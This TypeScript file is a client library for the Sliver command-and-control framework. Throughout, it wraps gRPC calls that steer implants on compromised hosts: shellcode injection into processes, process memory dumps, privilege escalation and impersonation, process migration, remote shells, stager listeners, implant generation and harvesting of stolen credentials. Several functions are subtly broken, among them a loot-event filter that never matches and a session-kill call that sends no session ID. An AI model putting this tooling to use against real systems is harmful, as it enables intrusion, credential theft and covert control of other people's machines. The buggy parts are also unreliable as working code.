import * as zlib from 'zlib';

import * as grpc from '@grpc/grpc-js';
import { Subject, Observable, Observer } from 'rxjs';
import { filter } from 'rxjs/operators';

import { commonpb } from './pb/commonpb/common';
import { sliverpb } from './pb/sliverpb/sliver';
import { clientpb } from './pb/clientpb/client';
import { rpcpb } from './pb/rpcpb/services';
import { Events } from './events';
import { SliverClientConfig } from './config';


const TIMEOUT = 30; // Default timeout in seconds
const Kb = 1024;
const Mb = 1024 * Kb;
const Gb = 1024 * Mb;

export async function gzip(data: Buffer): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    zlib.gzip(data, (err, result) => {
      err ? reject(err) : resolve(result);
    });
  });
}

export async function gunzip(data: Buffer): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    zlib.gunzip(data, (err, result) => {
      err ? reject(err) : resolve(result);
    });
  });
}

// Exported/simplified tunnel interfaces
export interface Tunnel {
  stdout: Observable<Buffer>
  stdin: Observer<Buffer>
}

// BaseCommands - Base command implementations shared between sessions and beacon
class BaseCommands {

  protected _rpc: rpcpb.SliverRPCClient;
  protected _tunnelStream: grpc.ClientDuplexStream<sliverpb.TunnelData, sliverpb.TunnelData>;

  constructor(rpc: rpcpb.SliverRPCClient, tunnelStream: grpc.ClientDuplexStream<sliverpb.TunnelData, sliverpb.TunnelData>) {
    this._rpc = rpc;
    this._tunnelStream = tunnelStream;
  }

  // request - should be overloaded by sub classes
  protected request(timeout: number): commonpb.Request { return new commonpb.Request(); }

  protected deadline(timeout = TIMEOUT) {
    return {
      'deadline': Date.now() + ((timeout + 1) * 1000)
    }
  }

  protected toUint8Array(buf: Buffer): Uint8Array {
    let arrayBuf = new ArrayBuffer(buf.length);
    let uint8Array = new Uint8Array(arrayBuf);
    for (let index = 0; index < buf.length; ++index) {
      uint8Array[index] = buf[index];
    }
    return uint8Array;
  }

  ping(nonce: number, timeout = TIMEOUT): Promise<sliverpb.Ping|undefined> {
    return new Promise((resolve, reject) => {
      const ping = new sliverpb.Ping();
      ping.Request = this.request(timeout)
      ping.Nonce = nonce
      this._rpc.Ping(ping, this.deadline(timeout), (err, pong) => {
        err ? reject(err) : resolve(pong);
      });
    });
  }

  ps(timeout = TIMEOUT): Promise<commonpb.Process[]|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.PsReq();
      req.Request = this.request(timeout);
      this._rpc.Ps(req, this.deadline(timeout), (err, ps) => {
        err ? reject(err) : resolve(ps?.Processes);
      });
    });
  }

  terminate(pid: number, timeout = TIMEOUT): Promise<sliverpb.Terminate|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.TerminateReq();
      req.Pid = pid;
      req.Request = this.request(timeout);
      this._rpc.Terminate(req, this.deadline(timeout), (err, terminate) => {
        err ? reject(err) : resolve(terminate);
      });
    });
  }

  ifconfig(timeout = TIMEOUT): Promise<sliverpb.Ifconfig|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.IfconfigReq();
      req.Request = this.request(timeout);
      this._rpc.Ifconfig(req, this.deadline(timeout), (err, ifconfig) => {
        err ? reject(err) : resolve(ifconfig);
      });
    });
  }

  netstat(timeout = TIMEOUT): Promise<sliverpb.Netstat|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.NetstatReq();
      req.Request = this.request(timeout);
      this._rpc.Netstat(req, this.deadline(timeout), (err, netstat) => {
        err ? reject(err) : resolve(netstat);
      });
    });
  }

  ls(path = '.', timeout = TIMEOUT): Promise<sliverpb.Ls|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.LsReq();
      req.Path = path;
      req.Request = this.request(timeout);
      this._rpc.Ls(req, this.deadline(timeout), (err, ls) => {
        err ? reject(err) : resolve(ls);
      });
    });
  }

  cd(path: string, timeout = TIMEOUT): Promise<sliverpb.Pwd|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.CdReq();
      req.Path = path;
      req.Request = this.request(timeout);
      this._rpc.Cd(req, this.deadline(timeout), (err, pwd) => {
        err ? reject(err) : resolve(pwd);
      });
    });
  }

  pwd(timeout = TIMEOUT): Promise<sliverpb.Pwd|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.PwdReq();
      req.Request = this.request(timeout);
      this._rpc.Pwd(req, this.deadline(timeout), (err, pwd) => {
        err ? reject(err) : resolve(pwd);
      });
    });
  }

  rm(path: string, timeout = TIMEOUT): Promise<sliverpb.Rm|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.RmReq();
      req.Path = path;
      req.Request = this.request(timeout);
      this._rpc.Rm(req, this.deadline(timeout), (err, rm) => {
        err ? reject(err) : resolve(rm);
      });
    });
  }

  mkdir(path: string, timeout = TIMEOUT): Promise<sliverpb.Mkdir|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.MkdirReq();
      req.Path = path;
      req.Request = this.request(timeout);
      this._rpc.Mkdir(req, this.deadline(timeout), (err, mkdir) => {
        err ? reject(err) : resolve(mkdir);
      });
    });
  }

  download(path: string, timeout = TIMEOUT): Promise<Buffer> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.DownloadReq();
      req.Path = path;
      req.Request = this.request(timeout);
      this._rpc.Download(req, this.deadline(timeout), async (err, download) => {
        if (err || download === undefined) {
          return reject(err ? err : 'Null response');
        }
        let data = Buffer.from(download.Data);
        if (download.Encoder === 'gzip') {
          data = await gunzip(data);
        } else if (download.Encoder !== '') {
          return reject(`Unsupported encoder ${download.Encoder}`);
        }
        resolve(data);
      });
    });
  }

  upload(path: string, data: Buffer, timeout = TIMEOUT): Promise<sliverpb.Upload|undefined> {
    return new Promise(async (resolve, reject) => {
      const req = new sliverpb.UploadReq();
      req.Path = path;
      req.Encoder = 'gzip';
      const payload = await gzip(data)
      req.Data = this.toUint8Array(payload);
      req.Request = this.request(timeout);
      this._rpc.Upload(req, this.deadline(timeout), (err, upload) => {
        err ? reject(err) : resolve(upload);
      });
    });
  }

  processDump(pid: number, timeout = TIMEOUT): Promise<sliverpb.ProcessDump|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.ProcessDumpReq();
      req.Pid = pid;
      req.Request = this.request(timeout);
      this._rpc.ProcessDump(req, this.deadline(timeout), (err, procdump) => {
        err ? reject(err) : resolve(procdump);
      });
    });
  }

  runAs(userName: string, processName: string, args: string, timeout = TIMEOUT): Promise<sliverpb.RunAs|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.RunAsReq();
      req.Username = userName;
      req.ProcessName = processName;
      req.Args = args;
      req.Request = this.request(timeout);
      this._rpc.RunAs(req, this.deadline(timeout), (err, runAs) => {
        err ? reject(err) : resolve(runAs);
      });
    });
  }

  impersonate(userName: string, timeout = TIMEOUT): Promise<sliverpb.Impersonate|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.ImpersonateReq();
      req.Username = userName;
      req.Request = this.request(timeout);
      this._rpc.Impersonate(req, this.deadline(timeout), (err, impersonate) => {
        err ? reject(err) : resolve(impersonate);
      });
    });
  }

  revToSelf(timeout = TIMEOUT): Promise<sliverpb.RevToSelf|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.RevToSelfReq();
      req.Request = this.request(timeout);
      this._rpc.RevToSelf(req, this.deadline(timeout), (err, revToSelf) => {
        err ? reject(err) : resolve(revToSelf);
      });
    });
  }

  getSystem(hostingProcess: string, config: clientpb.ImplantConfig, timeout = TIMEOUT): Promise<sliverpb.GetSystem|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.GetSystemReq();
      req.HostingProcess = hostingProcess;
      req.Config = config;
      req.Request = this.request(timeout);
      this._rpc.GetSystem(req, this.deadline(timeout), (err, getSystem) => {
        err ? reject(err) : resolve(getSystem);
      });
    });
  }

  // 'shellcode' aka "task"
  executeShellcode(pid: number, shellcode: Buffer, encoder: string, rwx: boolean, timeout = TIMEOUT): Promise<sliverpb.Task|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.TaskReq();
      req.Encoder = encoder;
      req.RWXPages = rwx;
      req.Pid = pid;
      req.Data = shellcode;
      req.Request = this.request(timeout);
      this._rpc.Task(req, this.deadline(timeout), (err, task) => {
        err ? reject(err) : resolve(task);
      });
    });
  }

  msf(payload: string, lhost: string, lport: number, encoder: string, iterations: number, timeout = TIMEOUT): Promise<void> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.MSFReq();
      req.Payload = payload;
      req.LHost = lhost;
      req.LPort = lport;
      req.Encoder = encoder;
      req.Iterations = iterations;
      req.Request = this.request(timeout);
      this._rpc.Msf(req, this.deadline(timeout), (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  msfRemote(pid: number, payload: string, lhost: string, lport: number, encoder: string, iterations: number, timeout = TIMEOUT): Promise<void> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.MSFRemoteReq();
      req.PID = pid;
      req.Payload = payload;
      req.LHost = lhost;
      req.LPort = lport;
      req.Encoder = encoder;
      req.Iterations = iterations;
      req.Request = this.request(timeout);
      this._rpc.Msf(req, (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  executeAssembly(assembly: Buffer, args: string, process: string, timeout = TIMEOUT): Promise<sliverpb.ExecuteAssembly|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.ExecuteAssemblyReq();
      req.Assembly = assembly;
      req.Arguments = args;
      req.Process = process;
      req.Request = this.request(timeout);
      this._rpc.ExecuteAssembly(req, this.deadline(timeout), (err, executeAssembly) => {
        err ? reject(err) : resolve(executeAssembly);
      });
    });
  }

  migrate(pid: number, config: clientpb.ImplantConfig, timeout = TIMEOUT): Promise<sliverpb.Migrate|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.MigrateReq();
      req.Pid = pid;
      req.Config = config;
      req.Request = this.request(timeout);
      this._rpc.Migrate(req, this.deadline(timeout), (err, migration) => {
        err ? reject(err) : resolve(migration);
      });
    });
  }

  execute(exe: string, args: string[], output: boolean, timeout = TIMEOUT): Promise<sliverpb.Execute|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.ExecuteReq();
      req.Path = exe;
      req.Args = args;
      req.Output = output;
      req.Request = this.request(timeout);
      this._rpc.Execute(req, this.deadline(timeout), (err, exec) => {
        err ? reject(err) : resolve(exec);
      });
    });
  }

  sideload(data: Buffer, processName: string, args: string, entryPoint: string, timeout = TIMEOUT): Promise<sliverpb.Sideload|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.SideloadReq();
      req.Data = data;
      req.ProcessName = processName;
      req.Args = args;
      req.EntryPoint = entryPoint;
      req.Request = this.request(timeout);
      this._rpc.Sideload(req, this.deadline(timeout), (err, exec) => {
        err ? reject(err) : resolve(exec);
      });
    });
  }

  spawnDLL(data: Buffer, entrypoint: string, processName: string, args: string, timeout = TIMEOUT): Promise<sliverpb.SpawnDll|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.InvokeSpawnDllReq();
      req.Data = data;
      req.ProcessName = processName;
      req.Args = args;
      req.EntryPoint = entrypoint;
      req.Request = this.request(timeout);
      this._rpc.SpawnDll(req, this.deadline(timeout), (err, dll) => {
        err ? reject(err) : resolve(dll);
      });
    });
  }

  screenshot(timeout = TIMEOUT): Promise<sliverpb.Screenshot|undefined> {
    return new Promise((resolve, reject) => {
      const req = new sliverpb.ScreenshotReq();
      req.Request = this.request(timeout);
      this._rpc.Screenshot(req, this.deadline(timeout), (err, screenshot) => {
        err ? reject(err) : resolve(screenshot);
      });
    });
  }

}

export class InteractiveBeacon extends BaseCommands {

  private _beaconID: string;

  constructor(rpc: rpcpb.SliverRPCClient, tunnelStream: grpc.ClientDuplexStream<sliverpb.TunnelData, sliverpb.TunnelData>, beaconID: string) {
    super(rpc, tunnelStream);
    this._beaconID = beaconID;
  }

  protected request(timeout: number): commonpb.Request {
    const req = new commonpb.Request();
    req.BeaconID = this._beaconID;
    req.Timeout = timeout;
    req.Async = true;
    return req;
  }

}

export class InteractiveSession extends BaseCommands {

  private _sessionID: string;

  constructor(rpc: rpcpb.SliverRPCClient,
    tunnelStream: grpc.ClientDuplexStream<sliverpb.TunnelData, sliverpb.TunnelData>,
    sessionId: string) {
    super(rpc, tunnelStream);
    this._sessionID = sessionId;
  }

  protected request(timeout: number): commonpb.Request {
    const req = new commonpb.Request();
    req.SessionID = this._sessionID;
    req.Timeout = timeout;
    return req;
  }

  shell(path: string, pty: boolean, timeout = TIMEOUT): Promise<Tunnel> {
    return new Promise((resolve, reject) => {

      const tunnel = new sliverpb.Tunnel();
      tunnel.SessionID = this._sessionID;

      this._rpc.CreateTunnel(tunnel, (err, rpcTunnel) => {
        if (err || rpcTunnel === undefined) {
          return reject(err);
        }
        const tunnelId = rpcTunnel.TunnelID;
        const tunnelData = new sliverpb.TunnelData();
        tunnelData.SessionID = this._sessionID;
        tunnelData.TunnelID = tunnelId;
        
        this._tunnelStream.write(tunnelData, () => {
          const req = new sliverpb.ShellReq();
          req.TunnelID = tunnelId;
          req.Path = path;
          req.EnablePTY = pty;
          req.Request = this.request(timeout);
          this._rpc.Shell(req, (err, shell) => {
            if (err || shell === undefined) {
              return reject(err);
            }
            const stdout = new Observable<Buffer>(producer => {
              this._tunnelStream.on('data', (tunnelData: sliverpb.TunnelData) => {
                if (tunnelData.TunnelID !== tunnelId) {
                  return; // Data is from another tunnel
                }
                const isClosed = tunnelData.Closed;
                if (isClosed) {
                  const drain = Buffer.from(tunnelData.Data);
                  if (drain.length) {
                    producer.next(drain);
                  }
                  producer.complete();
                } else {
                  producer.next(Buffer.from(tunnelData.Data));
                }
              });
            });

            const stdin: Observer<Buffer> = {
              next: (raw: Buffer) => {
                const data = new sliverpb.TunnelData();
                data.TunnelID = tunnelId;
                data.SessionID = this._sessionID;
                data.Data = raw;
                this._tunnelStream.write(data);
              },
              complete: () => {
                this._rpc.closeTunnel(rpcTunnel, () => { });
              },
              error: () => {
                this._rpc.closeTunnel(rpcTunnel, () => { });
              },
            };
            resolve({ stdin: stdin, stdout: stdout });
          });
        }); // Bind tunnel
      });
    });
  }

}


export class SliverClient {

  private _config: SliverClientConfig;
  private _rpc: rpcpb.SliverRPCClient | null = null;
  private empty = new commonpb.Empty();

  private lootEventTypes: string[] = [Events.LootAddedEvent, Events.LootRemovedEvent];
  private _events: grpc.ClientReadableStream<commonpb.Empty> | null = null;
  event$ = new Subject<clientpb.Event>();

  session$ = this.event$.pipe(filter(event => event.Session !== undefined));
  job$ = this.event$.pipe(filter(event => event.Job !== undefined));
  client$ = this.event$.pipe(filter(event => event.Client !== undefined));

  // Filter anything that doesn't match one of the loot event types
  loot$ = this.event$.pipe(filter(event => this.lootEventTypes.some(lootEventType => { 
    lootEventType === event.EventType
  })));

  private _tunnelStream: grpc.ClientDuplexStream<sliverpb.TunnelData, sliverpb.TunnelData> | null = null;

  constructor(config: SliverClientConfig) {
    this._config = config;
  }

  rpcHost(): string {
    return `${this._config.lhost}:${this._config.lport}`;
  }

  rpcCredentials(): grpc.ChannelCredentials {
    const ca = Buffer.from(this._config.ca_certificate);
    const privateKey = Buffer.from(this._config.private_key);
    const certificate = Buffer.from(this._config.certificate);
    
    return grpc.credentials.combineChannelCredentials(
      grpc.credentials.createSsl(ca, privateKey, certificate, {
        checkServerIdentity: () => undefined,
      }),
      grpc.credentials.createFromMetadataGenerator((args, cb) => {
        const meta = new grpc.Metadata();
        meta.set('Authorization', `Bearer ${this._config.token}`);
        cb(null, meta);
      }),
    );
  }

  get config(): SliverClientConfig {
    return this._config;
  }

  get rpc(): rpcpb.SliverRPCClient {
    if (this._rpc === null) {
      throw new Error('SliverRPCClient not connected');
    }
    return this._rpc;
  }

  get tunnelStream(): grpc.ClientDuplexStream<sliverpb.TunnelData, sliverpb.TunnelData> {
    if (this._tunnelStream === null) {
      throw new Error('SliverRPCClient not connected');
    }
    return this._tunnelStream;
  }

  get isConnected(): boolean {
    return this._rpc !== null;
  }

  connect(): Promise<SliverClient> {
    return new Promise((resolve, reject) => {

      const rpc = new rpcpb.SliverRPCClient(this.rpcHost(), this.rpcCredentials(), {
        'grpc.max_send_message_length': 2 * Gb,
        'grpc.max_receive_message_length': 2 * Gb,
      });
      rpc.GetVersion(this.empty, (err) => {
        if (err) {
          return reject(err);
        }

        // RPC Client
        this._rpc = rpc;

        // Events streams
        this._events = this.rpc.Events(this.empty);
        this._events?.on('data', event => { this.event$.next(event) });
        this._events?.on('error', err => { this.event$.error(err) });
        this._events?.on('end', () => { this.event$.complete() });

        // Tunnel streams
        this._tunnelStream = rpc.TunnelData();
        if (this._tunnelStream === undefined) {
          return reject('Failed to open tunnel data stream');
        }
        resolve(this);
      });
    });
  }

  async disconnect(): Promise<void> {
    if (this._events !== null) {
      this._events.on('error', () => { });
      this._events.cancel();
    }
    if (this._tunnelStream !== null) {
      this._tunnelStream.on('error', () => { });
      this._tunnelStream.cancel();
    }
    this.rpc.close();
    this._rpc = null;
  }

  private deadline(timeout: number) {
    return {
      'deadline': Date.now() + (timeout * 1000)
    }
  }

  // ---- Version ----

  getVersion(timeout = TIMEOUT): Promise<clientpb.Version|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.GetVersion(this.empty, this.deadline(timeout), (err, version) => {
        err ? reject(err) : resolve(version);
      });
    })
  }

  // ---- Operators ----

  getOperators(timeout = TIMEOUT): Promise<clientpb.Operator[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.GetOperators(this.empty, this.deadline(timeout), (err, operators) => {
        err ? reject(err) : resolve(operators?.Operators);
      });
    });
  }

  // ---- Sessions ----

  sessions(timeout = TIMEOUT): Promise<clientpb.Session[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.GetSessions(this.empty, this.deadline(timeout), (err, sessions) => {
        err ? reject(err) : resolve(sessions?.Sessions);
      });
    });
  }

  async interactSession(sessionID: string, timeout = TIMEOUT): Promise<InteractiveSession> {
    return new InteractiveSession(this.rpc, this.tunnelStream, sessionID);
  }

  async interactBeacon(beaconID: string, timeout = TIMEOUT): Promise<InteractiveBeacon> {
    return new InteractiveBeacon(this.rpc, this.tunnelStream, beaconID);
  }

  killSession(sessionId: string, timeout = TIMEOUT): Promise<void> {
    return new Promise((resolve, reject) => {
      const kill = new sliverpb.KillReq();
      
      // req.setSessionid(sessionId);
      // req.setTimeout(timeout);
      kill.Request = new commonpb.Request();

      this.rpc.Kill(kill, this.deadline(timeout), (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  // ---- Jobs ----

  jobs(timeout = TIMEOUT): Promise<clientpb.Job[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.GetJobs(this.empty, this.deadline(timeout), (err, jobs) => {
        err ? reject(err) : resolve(jobs?.Active);
      });
    });
  }

  killJob(jobId: number, timeout = TIMEOUT): Promise<clientpb.KillJob|undefined> {
    return new Promise((resolve, reject) => {
      const killJob = new clientpb.KillJobReq();
      killJob.ID = jobId;
      this.rpc.KillJob(killJob, this.deadline(timeout), (err, killed) => {
        err ? reject(err) : resolve(killed);
      });
    });
  }

  // ---- Listeners ----

  startMTLSListener(host: string, port: number, persistent = false, timeout = TIMEOUT): Promise<clientpb.MTLSListener|undefined> {
    return new Promise((resolve, reject) => {
      const mtls = new clientpb.MTLSListenerReq();
      mtls.Host = host;
      mtls.Port = port;
      mtls.Persistent = persistent;
      this.rpc.StartMTLSListener(mtls, this.deadline(timeout), (err, listener) => {
        err ? reject(err) : resolve(listener);
      });
    });
  }

  startDNSListener(domains: string[], canaries: boolean, host: string, port: number, persistent = false, timeout = TIMEOUT): Promise<clientpb.DNSListener|undefined> {
    return new Promise((resolve, reject) => {
      const dns = new clientpb.DNSListenerReq();
      dns.Domains = domains;
      dns.Canaries = canaries;
      dns.Host = host;
      dns.Port = port;
      dns.Persistent = persistent;
      this.rpc.StartDNSListener(dns, this.deadline(timeout), (err, listener) => {
        err ? reject(err) : resolve(listener);
      });
    });
  }

  startHTTPListener(domain: string, host: string, port: number, website = '', persistent = false, timeout = TIMEOUT): Promise<clientpb.HTTPListener|undefined> {
    return new Promise((resolve, reject) => {
      const http = new clientpb.HTTPListenerReq();
      http.Domain = domain;
      http.Host = host;
      http.Port = port;
      http.Secure = false;
      http.Website = website;
      http.Persistent = persistent;
      this.rpc.StartHTTPListener(http, this.deadline(timeout), (err, listener) => {
        err ? reject(err) : resolve(listener);
      });
    });
  }

  startHTTPSListener(domain: string, host: string, port: number, acme = false, website = '',
    cert?: Buffer, key?: Buffer, persistent = false,  timeout = TIMEOUT): Promise<clientpb.HTTPListener|undefined> {
    return new Promise((resolve, reject) => {
      const https = new clientpb.HTTPListenerReq();
      https.Domain = domain;
      https.Host = host;
      https.Port = port;
      https.Secure = true;
      cert ? https.Cert = cert : null;
      key ? https.Key = key : null;
      https.ACME = acme;
      https.Website = website;
      https.Persistent = persistent;
      this.rpc.StartHTTPSListener(https, this.deadline(timeout), (err, listener) => {
        err ? reject(err) : resolve(listener);
      });
    });
  }

  startWGListener(port: number, nPort: number, keyPort: number, persistent = false, timeout = TIMEOUT): Promise<clientpb.WGListener|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.WGListenerReq();
      req.Port = port;
      req.NPort = nPort;
      req.KeyPort = keyPort;
      req.Persistent = persistent;
      this.rpc.StartWGListener(req, this.deadline(timeout), (err, wgListener) => {
        err ? reject(err) : resolve(wgListener);
      });
    });
  }

  startTCPStagerListener(host: string, port: number, data: Buffer, timeout = TIMEOUT): Promise<clientpb.StagerListener|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.StagerListenerReq();
      req.Protocol = clientpb.StageProtocol.TCP;
      req.Host = host;
      req.Port = port;
      req.Data = data;
      this.rpc.StartTCPStagerListener(req, (err, tcpListener) => {
        err ? reject(err) : resolve(tcpListener);
      });
    });
  }

  startHTTPStagerListener(host: string, port: number, data: Buffer, timeout = TIMEOUT): Promise<clientpb.StagerListener|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.StagerListenerReq();
      req.Protocol = clientpb.StageProtocol.HTTP;
      req.Host = host;
      req.Port = port;
      req.Data = data;
      this.rpc.StartHTTPStagerListener(req, this.deadline(timeout), (err, httpListener) => {
        err ? reject(err) : resolve(httpListener);
      });
    });
  }

  startHTTPSStagerListener(host: string, port: number, data: Buffer, timeout = TIMEOUT): Promise<clientpb.StagerListener|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.StagerListenerReq();
      req.Protocol = clientpb.StageProtocol.HTTPS;
      req.Host = host;
      req.Port = port;
      req.Data = data;
      this.rpc.StartHTTPStagerListener(req, this.deadline(timeout), (err, httpsListener) => {
        err ? reject(err) : resolve(httpsListener);
      });
    });
  }

  // ---- Implants ----

  generate(config: clientpb.ImplantConfig, timeout = TIMEOUT): Promise<commonpb.File|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.GenerateReq();
      req.Config = config;
      this.rpc.Generate(req, this.deadline(timeout), (err, generated) => {
        err ? reject(err) : resolve(generated?.File);
      });
    });
  }

  compilerInfo(timeout = TIMEOUT): Promise<clientpb.Compiler|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.GetCompiler(new commonpb.Empty(), this.deadline(timeout), (err, info) => {
        err ? reject(err) : resolve(info);
      });
    });
  }

  regenerate(name: string, timeout = TIMEOUT): Promise<commonpb.File|undefined> {
    return new Promise((resolve, reject) => {
      const req = new clientpb.RegenerateReq();
      req.ImplantName = name;
      this.rpc.Regenerate(req, this.deadline(timeout), (err, generated) => {
        err ? reject(err) : resolve(generated?.File);
      });
    });
  }

  implantBuilds(timeout = TIMEOUT): Promise<clientpb.ImplantBuilds|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.ImplantBuilds(this.empty, this.deadline(timeout), (err, builds) => {
        err ? reject(err) : resolve(builds);
      });
    });
  }

  deleteImplantBuild(name: string, timeout = TIMEOUT): Promise<void> {
    const delReq = new clientpb.DeleteReq();
    delReq.Name = name;
    return new Promise((resolve, reject) => {
      this.rpc.DeleteImplantBuild(delReq, this.deadline(timeout), (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  canaries(timeout = TIMEOUT): Promise<clientpb.DNSCanary[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.Canaries(this.empty, this.deadline(timeout), (err, canaries) => {
        err ? reject(err) : resolve(canaries?.Canaries);
      });
    });
  }

  implantProfiles(timeout = TIMEOUT): Promise<clientpb.ImplantProfile[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.ImplantProfiles(this.empty, this.deadline(timeout), (err, profiles) => {
        err ? reject(err) : resolve(profiles?.Profiles);
      });
    });
  }

  saveImplantProfile(profile: clientpb.ImplantProfile, timeout = TIMEOUT): Promise<clientpb.ImplantProfile|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.SaveImplantProfile(profile, this.deadline(timeout), (err, profile) => {
        err ? reject(err) : resolve(profile);
      });
    });
  }

  deleteImplantProfile(name: string, timeout = TIMEOUT): Promise<void> {
    const delReq = new clientpb.DeleteReq();
    delReq.Name = name;
    return new Promise((resolve, reject) => {
      this.rpc.DeleteImplantProfile(delReq, this.deadline(timeout), (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  // ---- Loot ----
  lootAll(timeout = TIMEOUT): Promise<clientpb.Loot[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.LootAll(this.empty, this.deadline(timeout), (err, loot) => {
        err ? reject(err) : resolve(loot?.Loot);
      });
    });
  }

  lootAllOf(lootType: string, timeout = TIMEOUT): Promise<clientpb.Loot[]|undefined> {

    // There doesn't seem to be a good way to strongly type this parameter
    const loot = new clientpb.Loot();
    switch (lootType.toLowerCase()) {
      case 'c':
      case 'cred':
      case 'creds':
      case 'credential':
      case 'credentials':
        loot.Type = clientpb.LootType.LOOT_CREDENTIAL;
        break;

      case 'f':
      case 'file':
      case 'files':
        loot.Type = clientpb.LootType.LOOT_FILE;
        break;

      default:
        throw new Error(`Unknown loot type: ${lootType}`);
    }

    return new Promise((resolve, reject) => {
      this.rpc.LootAllOf(loot, this.deadline(timeout), (err, allLoot) => {
        err ? reject(err) : resolve(allLoot?.Loot);
      });
    });
  }

  lootAdd(loot: clientpb.Loot, timeout = TIMEOUT): Promise<clientpb.Loot|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.LootAdd(loot, this.deadline(timeout), (err, loot) => {
        err ? reject(err) : resolve(loot);
      });
    });
  }

  lootUpdate(lootID: string, name: string, timeout = TIMEOUT): Promise<clientpb.Loot|undefined> {
    const loot = new clientpb.Loot();
    loot.LootID = lootID;
    loot.Name = name;
    return new Promise((resolve, reject) => {
      this.rpc.LootUpdate(loot, this.deadline(timeout), (err, loot) => {
        err ? reject(err) : resolve(loot);
      });
    });
  }

  lootRemove(lootID: string, timeout = TIMEOUT): Promise<void> {
    const loot = new clientpb.Loot();
    loot.LootID = lootID;
    return new Promise((resolve, reject) => {
      this.rpc.LootRm(loot, this.deadline(timeout), (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  lootContent(lootID: string, timeout = TIMEOUT): Promise<clientpb.Loot|undefined> {
    const loot = new clientpb.Loot();
    loot.LootID = lootID;
    return new Promise((resolve, reject) => {
      this.rpc.LootContent(loot, this.deadline(timeout), (err, loot) => {
        err ? reject(err) : resolve(loot);
      });
    });
  }

  // ---- Websites ----
  
  websites(timeout = TIMEOUT): Promise<clientpb.Website[]|undefined> {
    return new Promise((resolve, reject) => {
      this.rpc.Websites(this.empty, this.deadline(timeout), (err, websites) => {
        err ? reject(err) : resolve(websites?.Websites);
      });
    });
  }

  website(name: string, timeout = TIMEOUT): Promise<clientpb.Website|undefined> {
    return new Promise((resolve, reject) => {
      const web = new clientpb.Website();
      web.Name = name;
      this.rpc.Website(web, this.deadline(timeout), (err, website) => {
        err ? reject(err) : resolve(website);
      });
    });
  }

  websiteRemove(name: string, timeout = TIMEOUT): Promise<void> {
    return new Promise((resolve, reject) => {
      const web = new clientpb.Website();
      web.Name = name;
      this.rpc.WebsiteRemove(web, this.deadline(timeout), (err) => {
        err ? reject(err) : resolve();
      });
    });
  }

  websiteAddContent(name: string, contents: Map<string, clientpb.WebContent>, timeout = TIMEOUT): Promise<clientpb.Website|undefined> {
    return new Promise((resolve, reject) => {
      const addContent = new clientpb.WebsiteAddContent();
      addContent.Name = name;
      addContent.Contents = contents;
      this.rpc.WebsiteAddContent(addContent, this.deadline(timeout), (err, website) => {
        err ? reject(err) : resolve(website);
      });
    });
  }

  websiteUpdateContent(name: string, contents: Map<string, clientpb.WebContent>, timeout = TIMEOUT): Promise<clientpb.Website|undefined> {
    return new Promise((resolve, reject) => {
      const addContent = new clientpb.WebsiteAddContent();
      addContent.Name = name;
      addContent.Contents = contents;
      this.rpc.WebsiteUpdateContent(addContent, this.deadline(timeout), (err, website) => {
        err ? reject(err) : resolve(website);
      });
    });
  }

  websiteRemoveContent(name: string, paths: string[], timeout = TIMEOUT): Promise<clientpb.Website|undefined> {
    return new Promise((resolve, reject) => {
      const rm = new clientpb.WebsiteRemoveContent();
      rm.Name = name;
      rm.Paths = paths;
      this.rpc.WebsiteRemoveContent(rm, this.deadline(timeout), (err, website) => {
        err ? reject(err) : resolve(website);
      });
    });
  }

}
